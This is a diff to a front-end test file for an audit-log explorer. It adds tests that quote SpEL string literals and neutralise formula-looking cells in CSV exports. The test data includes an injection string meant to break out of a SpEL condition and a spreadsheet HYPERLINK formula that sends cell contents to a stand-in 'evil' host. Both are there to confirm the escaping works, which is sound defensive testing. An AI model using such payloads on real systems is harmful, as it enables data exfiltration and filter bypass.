@@ -3,6 +3,7 @@ import userEvent from '@testing-library/user-event';
 import { describe, expect, it, vi } from 'vitest';
 import type { AuditLogRow } from '../api/types';
 import { auditLogCsv } from '../util/csv';
+import { spelStringLiteral } from '../util/spel';
 import { PAGE_SIZE } from '../pages/AuditLogPage';
 import { ALERTS, callsTo, jsonResponse, renderApp } from './helpers';
 
@@ -114,11 +115,11 @@ describe('audit log explorer', () => {
     expect(await within(second).findByText('No rule fired on this event.')).toBeInTheDocument();
   });
 
-  it('"create rule from this event" carries the event into the rule editor', async () => {
+  it('"create rule from this event" carries the event into the rule editor, quoting the SpEL way', async () => {
     const user = userEvent.setup();
     renderApp('/audit-log?event=evt-2&range=30d', {
       'GET /api/v1/audit-logs': () => jsonResponse(ROWS),
-      'GET /api/v1/audit-logs/evt-2': () => jsonResponse({ event: ROWS[1], alerts: [] }),
+      'GET /api/v1/audit-logs/evt-2': () => jsonResponse({ event: { ...ROWS[1], action: "O'Brien's export" }, alerts: [] }),
     });
 
     await screen.findByRole('dialog', { name: 'Event' });
@@ -126,13 +127,24 @@ describe('audit log explorer', () => {
     expect(await screen.findByRole('heading', { name: 'Rules' })).toBeInTheDocument();
   });
 
-  it('exports what is on screen as CSV', () => {
-    const csv = auditLogCsv([row(1), row(2, { resource: 'a "quoted", thing', action: null })]);
+  it('pre-fills the condition with SpEL quoting, not backslashes', () => {
+    expect(spelStringLiteral("O'Brien's export")).toBe("'O''Brien''s export'");
+    expect(spelStringLiteral("x' or true == true or resource == 'y")).toBe("'x'' or true == true or resource == ''y'");
+    expect(spelStringLiteral('plain')).toBe("'plain'");
+  });
+
+  it('exports what is on screen as CSV, with formula-looking cells neutralised', () => {
+    const csv = auditLogCsv([
+      row(1),
+      row(2, { resource: 'a "quoted", thing', action: null }),
+      row(3, { resource: '=HYPERLINK("https://evil/?"&A1,"click")', action: '+1', userId: '@SUM(1)', sessionId: '-x' }),
+    ]);
     const lines = csv.split('\r\n');
     expect(lines[0]).toBe('eventId,occurredAt,eventType,userId,sessionId,resource,action,riskLevel,anomalous,controls');
     expect(lines[1]).toBe('evt-1,2026-09-07T11:59:00.000Z,AUTH_EVENT,boris,,login,LOGIN_FAILURE,MEDIUM,false,"SOC2:AC-2,SOC2:IA-2"');
     expect(lines[2]).toContain('"a ""quoted"", thing",,MEDIUM');
-    expect(lines[3]).toBe('');
+    expect(lines[3]).toContain(`'@SUM(1),'-x,"'=HYPERLINK(""https://evil/?""&A1,""click"")",'+1,MEDIUM`);
+    expect(lines[4]).toBe('');
   });
 
   it('shows empty and error states', async () => {
